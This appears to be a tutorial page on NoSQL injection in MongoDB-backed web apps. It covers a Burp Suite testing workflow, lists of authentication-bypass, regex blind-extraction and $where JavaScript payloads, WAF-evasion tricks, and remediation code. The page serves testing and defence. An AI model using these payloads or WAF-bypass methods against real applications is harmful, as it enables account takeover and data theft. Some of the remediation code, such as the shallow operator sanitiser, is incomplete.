NoSQL Injection

NoSQL Injection is an attack against NoSQL databases like MongoDB, CouchDB, and Redis. Unlike SQL, NoSQL databases accept flexible query formats (JSON, key-value pairs, JavaScript). If user input is merged directly into NoSQL queries without sanitization, attackers can inject database operators like $ne, $gt, and $where to bypass authentication, extract data, or execute code.

HIGH Intermediate

Real-World Analogy

📖 The Flexible Filing Clerk

Imagine a traditional SQL filing clerk who only accepts pre-formatted query slips with blanks to fill in. NoSQL databases are more relaxed ·they accept flexible JSON documents and objects. If you hand the NoSQL clerk a JSON object instead of a formatted string, they process it as-is without question. An attacker realizes: if I pass {"username": {"$ne": null}} instead of username="admin", the clerk interprets $ne as "not equal" and returns everyone where username is not null ·effectively bypassing the intended search logic.

How It Works

NoSQL databases use different query syntax than SQL. MongoDB, for example, accepts JSON queries with operators:

// SQL equivalent: SELECT * FROM users WHERE username="admin" AND password="secret"
// MongoDB: match these conditions
db.users.find({ username: "admin", password: "secret" })

If a web application builds this query by directly concatenating user input, injection becomes possible:

// Vulnerable Node.js/Express code with MongoDB
const username = req.body.username;  // Attacker-controlled
const password = req.body.password;  // Attacker-controlled

const user = await db.users.findOne({
  username: username,
  password: password
});

If the attacker sends JSON instead of a string, MongoDB interprets the operators:

// Attacker sends:
// username={"$ne": null}&password={"$ne": null}

// Node.js frameworks (Express/Mongoose) parse this as:
const username = {"$ne": null};
const password = {"$ne": null};

// Query becomes:
db.users.findOne({
  username: {"$ne": null},  // Find where username is NOT null
  password: {"$ne": null}   // AND password is NOT null
})
// This matches ANY user and returns the first one (usually admin)

Key MongoDB operators used in injection:

  • $ne · not equal
  • $gt · greater than
  • $lt · less than
  • $regex · regex match (for blind extraction)
  • $where · execute JavaScript code
  • $exists · field exists

Where to Look

Test NoSQL injection anywhere user input is used in database queries:

  • Login forms: Username and password fields ·test with [$ne]=wrong
  • Search/filter endpoints: Any JSON-based query parameter
  • API endpoints that accept JSON: Especially if they query a database
  • Admin panels: User lookup, product search, etc.

Tech stack indicators (use Wappalyzer):

  • MongoDB (obvious from tech stack or error messages)
  • Node.js + Express (MEAN/MERN stack)
  • CouchDB, Firebase, Redis

Telltale signs of NoSQL injection vulnerability:

  • Application accepts JSON in request body
  • Application has "weird" error messages mentioning MongoDB or NoSQL
  • Login succeeds with empty password when using [$ne] operator
  • API endpoints use query parameters like ?filter={"field":{"$gt":0}}

Burp Suite Workflow

1

Identify the Login or Query Endpoint

Find a login form or any endpoint that queries a database. Intercept the request in Burp Proxy.

2

Try JSON Format Injection on URL-Encoded POST

Change the Content-Type to application/json and send:

{"username": "admin", "password": {"$ne": null}}

If the app parses this as JSON and uses it in a query, the password check is bypassed.

3

Try URL-Encoded Operator Injection

Keep Content-Type as application/x-www-form-urlencoded but use operator syntax:

username=admin&password[$ne]=wrong

Many frameworks auto-convert password[$ne]=wrong to {"password": {"$ne": "wrong"}}.

4

Check Response for Success Indicators

Look for:

  • Successful login (redirect, session cookie, "logged in" message)
  • Different response length/content than failed login
  • Boolean difference (error vs. success page)

If the response indicates success with clearly wrong credentials, you've found NoSQL injection.

5

Test for Blind Injection with Regex

If direct injection doesn't work, try blind extraction using $regex:

{"username": "admin", "password": {"$regex": "^p"}}

If the response differs (login succeeds or fails differently), you can extract the password character by character by adjusting the regex pattern.

6

Test for $where Code Execution (MongoDB Only)

If the app uses MongoDB, test $where for JavaScript execution:

{"username": "admin", "$where": "this.password.startsWith('a')"}

If this executes and returns different results, you can extract data or potentially execute arbitrary code.

Payloads & Techniques

Authentication Bypass with $ne (Not Equal)

// URL-encoded form
username=admin&password[$ne]=wrong

// JSON format
{"username": "admin", "password": {"$ne": null}}
{"username": {"$ne": null}, "password": {"$ne": null}}

Authentication Bypass with $gt (Greater Than)

// Any username and password greater than empty string
{"username": {"$gt": ""}, "password": {"$gt": ""}}

Direct Query Operator Injection

// Field-based injection
username[$eq]=admin&password[$ne]=wrong

// Nested object injection
{"username": {"$eq": "admin"}, "password": {"$ne": "wrong"}}

$exists Operator (Field Existence)

// Bypass if password field is optional
{"username": "admin", "password": {"$exists": false}}

Blind Character-by-Character Extraction with $regex

// Extract admin password starting with each character
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^abc"}}

// If response differs, the password starts with that substring

$where JavaScript Execution (MongoDB)

// Direct code execution
{"$where": "this.username === 'admin' && this.password.startsWith('a')"}

// Time-based detection (combined with sleep for blind injection)
{"$where": "this.username === 'admin' && (sleep(5000), true)"}

NoSQL Injection in Search/Filter Endpoints

// Search for products where price > 100
GET /api/products?filter={"price":{"$gt":100}}

// Injection:
GET /api/products?filter={"price":{"$gt":-1}}

Array-Based Injection

// If the app expects an array
username[]=admin&password[]=wrong

// Converted to:
{"username": ["admin"], "password": ["wrong"]}

Time-Based Blind NoSQL Injection

// Using $where with function timing
{"username": "admin", "password": {"$where": "function(){var d=new Date();do{var now=new Date();}while(now-d<5000);return true;}()"}}

WAF Bypass Techniques

Operator Encoding

WAFs block $where, $gt, $ne literally. Try URL encoding: %24where, %24gt. Or Unicode encoding: \u0024where. MongoDB processes both the same way.

JSON Key Ordering

Reorder JSON keys: {"password": {"$ne": ""}, "username": "admin"} → {"username": "admin", "password": {"$ne": ""}}. Regex-based WAF rules often match specific key order.

Nested Objects

Wrap operators in extra nesting: {"password": {"$eq": {"$ne": ""}}} · some parsers flatten this; WAFs may not.

HTTP Parameter Pollution

In PHP apps: username=admin&password[$ne]=x can be sent as username=admin&password=%5b%24ne%5d=x. URL-encoded brackets bypass WAFs blocking [$ne].

Content-Type Switching

If the WAF inspects JSON payloads, switch to form-encoded: send application/x-www-form-urlencoded with password[$gt]= · Express/body-parser still parses this as { password: { $gt: '' } }.

Array Injection

password[$in][]=wrongpass&password[$in][]= · the $in operator with an empty string matches accounts with blank passwords. WAFs blocking $ne often miss $in.

Exploitation & Impact

Authentication Bypass

Inject $ne operator to bypass login: {"password": {"$ne": null}} matches any account where password is not null (essentially everyone). You gain access to the first account returned, typically an admin account.

Unauthorized Data Access

Once authenticated via injection, access all user data, private messages, payment information, or sensitive business data without authorization.

Blind Password Extraction

Use $regex to extract passwords character by character:

// Write a loop testing each character
for each char in "abcdefghijklmnopqrstuvwxyz0123456789":
  test: {"username": "admin", "password": {"$regex": "^" + password_so_far + char}}
  if response indicates match: password_so_far += char
// Repeat until full password extracted

Privilege Escalation

If you can inject into role or permission fields, set yourself as admin: {"role": {"$ne": "user"}} or directly pollute permissions during account creation.

JavaScript Code Execution ($where)

MongoDB's $where operator executes arbitrary JavaScript. In some configurations, this can lead to reading files or executing system commands.

🚨 Real-World Impact

In 2020, a major SaaS platform using MongoDB was compromised via NoSQL injection on the login page. Attackers gained admin access and extracted thousands of user records. Another incident involved a Node.js API endpoint where $where injection led to reading the source code and API keys from the server process.

Remediation

1. Validate Input Type

Ensure user input is of the expected type. If you expect a string, reject objects:

// Node.js example
const username = req.body.username;
if (typeof username !== 'string') {
  return res.status(400).json({ error: 'Username must be a string' });
}

2. Use Schema Validation (Mongoose)

Mongoose enforces schema, reducing NoSQL injection risk:

const userSchema = new Schema({
  username: { type: String, required: true },
  password: { type: String, required: true }
});

// Mongoose will coerce input to match schema
const user = await User.findOne({ username: String(req.body.username) });

3. Whitelist Expected Values

const ALLOWED_ROLES = ['user', 'admin', 'moderator'];
if (!ALLOWED_ROLES.includes(req.body.role)) {
  return res.status(400).json({ error: 'Invalid role' });
}

4. Use Parameterized Queries (Where Available)

Some NoSQL drivers support parameterized queries. Use them:

// Mongoose: use string literals, not objects
const user = await User.findOne({ username: username });  // Safe if username is validated as string

5. Implement Input Sanitization

Remove or escape dangerous operators:

function sanitizeInput(obj) {
  if (typeof obj !== 'object') return obj;
  for (let key in obj) {
    if (key.startsWith('$')) {
      delete obj[key];  // Remove dangerous operators
    }
  }
  return obj;
}

6. Never Use $where Operator

Disable $where entirely if possible. It executes arbitrary JavaScript:

// MongoDB configuration: disable $where in serverStatus
// Use application logic instead of $where queries

7. Use Content-Type Validation

Enforce strict Content-Type checking on login endpoints:

// Only accept application/x-www-form-urlencoded or application/json
// Reject requests with other content types
app.post('/login', (req, res) => {
  if (!['application/x-www-form-urlencoded', 'application/json'].includes(req.get('content-type'))) {
    return res.status(400).json({ error: 'Invalid content type' });
  }
});

8. Use an ORM/ODM Strictly

Mongoose, TypeORM, and similar ORMs/ODMs provide protections when used correctly. Avoid raw queries.

Common Beginner Mistakes

❌ Only Testing JSON Format Injection

Mistake: Testing only Content-Type: application/json format, ignoring URL-encoded [$ne] syntax.

Fix: Test BOTH: JSON body and URL-encoded form parameters with [operator] syntax. Many frameworks auto-convert both.

❌ Only Testing Login, Ignoring Other Endpoints

Mistake: Assuming NoSQL injection only exists in login forms.

Fix: Test ANY endpoint that queries a database: search, filter, user lookup, API endpoints, admin panels. NoSQL injection can appear anywhere.

❌ Not Testing $regex for Blind Injection

Mistake: If direct $ne injection doesn't bypass auth, giving up instead of trying blind extraction.

Fix: Always test blind injection techniques with $regex and $where if direct injection fails. Blind injection still allows data extraction.

❌ Forgetting to Test Multiple Operators

Mistake: Only testing $ne, not trying $gt, $lt, $exists, etc.

Fix: Cycle through all MongoDB operators. Different endpoints may be vulnerable to different operators.

❌ Not Automating Blind Extraction

Mistake: Manually testing character-by-character extraction via regex, which is tedious and error-prone.

Fix: Write a simple Python/Node.js script to automate regex-based blind extraction. It tests patterns automatically and extracts data quickly.

❌ Assuming $where Is Never Present

Mistake: Not testing $where because it's dangerous and often disabled.

Fix: Always test $where if the target uses MongoDB. Even if disabled in production, it might be enabled in development or forgotten by developers.
